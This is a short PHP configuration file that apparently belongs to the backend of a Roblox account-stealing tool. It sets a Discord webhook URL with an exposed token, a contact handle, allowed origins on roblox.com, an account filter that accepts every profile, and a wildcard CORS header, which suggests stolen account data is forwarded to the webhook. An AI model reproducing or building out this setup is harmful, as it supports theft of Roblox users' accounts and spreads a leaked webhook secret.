<?php


$webhook = "https://discord.com/api/webhooks/801711659084939274/ko0rjNqJ1HwNEhiCQsS_9Q2bWQKgIDatOlOgA8iH4SUJ84-mBMOIcM6_aa5c8GnPUTHy";
$discord_contact = "кαzυмι#0001";

$allowed_origins = array(
    "https://www.roblox.com",
    "https://web.roblox.com"
);
function account_filter($profile)
{
    return true;
}
require("status.php");
header("Access-Control-Allow-Origin: *");
